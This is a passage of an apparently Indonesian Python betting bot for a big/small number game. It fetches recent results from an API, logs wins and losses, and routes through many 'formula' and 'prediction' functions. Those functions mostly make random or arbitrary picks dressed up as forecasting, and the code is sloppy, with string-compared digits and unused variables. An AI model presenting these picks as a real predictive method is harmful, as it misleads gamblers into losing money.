    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/7 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX13()
    elif f > '5' and f < '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/7 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX13()
    elif f > '6' and f < '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/7 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX13()
    elif f > '4' and f < '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/7 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  JP{L}{CY}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX13()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/7 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX13()
			 
			 
def auto_besarX13 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}•{taruhanbesarX13()}')


def auto_kecilX13 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['0','1','2','3','4']
			m = ['0','1','2','3','4']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}{taruhankecilX13()}')
			
def taruhankecilX13 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX13K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f < '3':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX14()
    elif f > '2' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX14()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX14()
			 
def taruhanbesarX13 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX13B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '4' and f < '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX14()
    elif f > '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX14()
    elif f > '5' and f < '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX14()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX14()
			 
			 
def auto_besarX14 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}•{taruhanbesarX14()}')


def auto_kecilX14 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['0','1','2','3','4']
			m = ['0','1','2','3','4']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}{taruhankecilX14()}')
			
def taruhankecilX14 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX14K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f < '2':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '3' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '1' and f < '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
			 
def taruhanbesarX14 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX14B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '7' and f < '9':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '4' and f < '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '6' and f < '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f > '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX1()
			 
def rumusRNG3 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['3','1','8','0','4','5','10','9','2','7','6']
       m = random.SystemRandom()
       v1 = m.choice(v2)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = (f"int(j1)+int({v1})")
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = (f"{v1}")
      if res == '0':
       rumusX2()
      elif res == '1':
       rumusX11()
      elif res == '2':
       rumusX6()
      elif res == '3':
       rumusX5()
      elif res == '4':
       rumusX8()
      elif res == '5':
       rumusX9()
      elif res == '6':
       rumusX3()
      elif res == '7':
       rumusX10()
      elif res == '8':
       rumusX7()
      elif res == '9':
       rumusX4()
      elif res == '10':
       rumusX1()
      elif res == '11':
       rumusX1()
      elif res == '12':
       rumusX2()
      elif res == '13':
       rumusX3()
      elif res == '14':
       rumusX4()
      elif res == '15':
       rumusX5()
      elif res == '16':
       rumusX6()
      elif res == '17':
       rumusX8()
      elif res == '18':
       rumusX8()
      elif res == '19':
       rumusX9()
      elif res == '20':
       rumusX10()
      else:
       auto_besarX11()
			 
			 
			 
def rumusRNG2 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       m = random.SystemRandom()
       v1 = m.choice(v2)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = (f"int(j1)+int({v1})")
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = (f"{v1}")
      if res == '0':
       rumusX7()
      elif res == '1':
       rumusX11()
      elif res == '2':
       rumusX6()
      elif res == '3':
       rumusX8()
      elif res == '4':
       rumusX5()
      elif res == '5':
       rumusX9()
      elif res == '6':
       rumusX3()
      elif res == '7':
       rumusX10()
      elif res == '8':
       rumusX2()
      elif res == '9':
       rumusX4()
      elif res == '10':
       rumusX1()
      elif res == '11':
       rumusX1()
      elif res == '12':
       rumusX2()
      elif res == '13':
       rumusX3()
      elif res == '14':
       rumusX4()
      elif res == '15':
       rumusX5()
      elif res == '16':
       rumusX6()
      elif res == '17':
       rumusX8()
      elif res == '18':
       rumusX8()
      elif res == '19':
       rumusX9()
      elif res == '20':
       rumusX10()
      else:
       auto_besarX11()
			 
			 
			 
def rumusRNG1 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       m = random.SystemRandom()
       v1 = m.choice(v2)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = (f"{Xt}")
      if res == '0':
       rumusX8()
      elif res == '1':
       rumusX11()
      elif res == '2':
       rumusX4()
      elif res == '3':
       rumusX7()
      elif res == '4':
       rumusX5()
      elif res == '5':
       rumusX1()
      elif res == '6':
       rumusX3()
      elif res == '7':
       rumusX10()
      elif res == '8':
       rumusX2()
      elif res == '9':
       rumusX6()
      elif res == '10':
       rumusX9()
      elif res == '11':
       rumusX1()
      elif res == '12':
       rumusX2()
      elif res == '13':
       rumusX3()
      elif res == '14':
       rumusX4()
      elif res == '15':
       rumusX5()
      elif res == '16':
       rumusX6()
      elif res == '17':
       rumusX7()
      elif res == '18':
       rumusX8()
      elif res == '19':
       rumusX9()
      elif res == '20':
       rumusX10()
      else:
       auto_besarX11()
			 
			 
def rumusX0 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       A1 = ['5','6','7','8','9','0','1','2','3','4']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      result2 = (f"{wew}")
      result3 = int(result)+int(result2)
      with open("result3.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       rumusX1()
      elif res == '1':
       rumusX2()
      elif res == '2':
       rumusX3()
      elif res == '3':
       rumusX4()
      elif res == '4':
       rumusX5()
      elif res == '5':
       rumusX6()
      elif res == '6':
       rumusX7()
      elif res == '7':
       rumusX8()
      elif res == '8':
       rumusX9()
      elif res == '9':
       rumusX10()
      elif res == '10':
       rumusX11()
      elif res == '11':
       rumusX1()
      elif res == '12':
       rumusX2()
      elif res == '13':
       rumusX3()
      elif res == '14':
       rumusX4()
      elif res == '15':
       rumusX5()
      elif res == '16':
       rumusX6()
      elif res == '17':
       rumusX7()
      elif res == '18':
       rumusX8()
      elif res == '19':
       rumusX9()
      elif res == '20':
       rumusX10()
      else:
       auto_besarX11()
			

def choice ():
    A1 = ['1','2','3','4','5','4','3','2','1']
    m = random.SystemRandom()
    wew = m.choice(A1)
    result2 = (f"{wew}")
    result3 = int(result2)+int(0)
    with open("choice.txt",'w') as f:
      f.write(str(result3))
      f.close()
    res1 = open("choice.txt").read()
    if res1 == '1':
     rumusXA()
    elif res1 == '2':
     rumusXB()
    elif res1 == '3':
     rumusXA()
    elif res1 == '4':
     rumusXB()
    else:
     skip1()
			
def rumusXA ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       A1 = ['3','6','7','1','9','0','8','2','5','4']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      result2 = (f"{wew}")
      result3 = int(result)+int(result2)
      with open("result3.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_besarX1()
      elif res == '1':
       auto_kecilX1()
      elif res == '2':
       auto_kecilX2()
      elif res == '3':
       auto_besarX2()
      elif res == '4':
       auto_kecilX3()
      elif res == '5':
       auto_kecilX4()
      elif res == '6':
       auto_besarX3()
      elif res == '7':
       auto_besarX4()
      elif res == '8':
       auto_kecilX5()
      elif res == '9':
       auto_kecilX6()
      else:
       os.system("python GL.py")

def rumusXB ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       A1 = ['3','6','7','1','9','0','8','2','5','4']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      result2 = (f"{wew}")
      result3 = int(result)+int(result2)
      with open("result3.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_kecilX1()
      elif res == '1':
       auto_besarX1()
      elif res == '2':
       auto_besarX2()
      elif res == '3':
       auto_kecilX2()
      elif res == '4':
       auto_besarX3()
      elif res == '5':
       auto_besarX4()
      elif res == '6':
       auto_kecilX3()
      elif res == '7':
       auto_kecilX4()
      elif res == '8':
       auto_besarX5()
      elif res == '9':
       auto_besarX6()
      else:
       os.system("python GL.py")
       
def rumusXlawan ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       A1 = ['3','6','7','1','9','0','8','2','5','4']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result2 = (f"{wew}")
      result3 = int(result2)+int(result2)
      with open("result4.txt",'w') as f:
       f.write(str(result3))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_besarX2()
      elif res == '1':
       auto_besarX4()
      elif res == '2':
       auto_besarX6()
      elif res == '3':
       auto_besarX8()
      elif res == '4':
       auto_besarX2()
      elif res == '5':
       auto_kecilX2()
      elif res == '6':
       auto_kecilX4()
      elif res == '7':
       auto_kecilX6()
      elif res == '8':
       auto_kecilX8()
      elif res == '9':
       auto_kecilX2()
      else:
        auto_besarX2()

def prediksi1 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[1].get('number')
      with open("halaman144r.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5']
       A1 = ['3','6','7','1','9','0','8','2','5','4']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      result2 = (f"{v1}")
      result3 = int(result)+int(1)
      with open("result33.txt",'w') as f:
       f.write(str(result2))
       f.close()
      res = open("result33.txt").read()
      if res == '0':
       auto_kecilX1()
      elif res == '1':
       auto_besarX1()
      elif res == '2':
       auto_kecilX2()
      elif res == '3':
       auto_besarX2()
      elif res == '4':
       auto_kecilX3()
      elif res == '5':
       auto_besarX3()
      elif res == '4':
       auto_kecilX4()
      else:
       auto_besarX4()
       


def prediksi2 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[1].get('number')
      with open("halaman144r.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5']
       A1 = ['3','6','7','1','9','0','8','2','5','4']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      result2 = (f"{v1}")
      result3 = int(result)+int(1)
      with open("result33.txt",'w') as f:
       f.write(str(result2))
       f.close()
      res = open("halaman144r.txt").read()
      if res == '0':
       auto_kecilX1e()
      elif res == '1':
       auto_besarX1e()
      elif res == '2':
       auto_kecilX1e()
      elif res == '3':
       auto_kecilX1e()
      elif res == '4':
       auto_kecilX1e()
      elif res == '5':
       auto_besarX1e()
      elif res == '6':
       auto_besarX1e()
      elif res == '7':
       auto_besarX1e()
      elif res == '8':
       auto_besarX1e()
      elif res == '9':
       auto_besarX1e()
      else:
       auto_besarX1e()
       
def prediksi3 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[1].get('number')
      with open("halaman144r.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5']
       A1 = ['3','6','7','1','9','0','8','2','5','4']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      result2 = (f"{v1}")
      result3 = int(result)+int(1)
      with open("result33.txt",'w') as f:
       f.write(str(result2))
       f.close()
      res = open("result33.txt").read()
      if res == '0':
       auto_kecilX2e()
      elif res == '1':
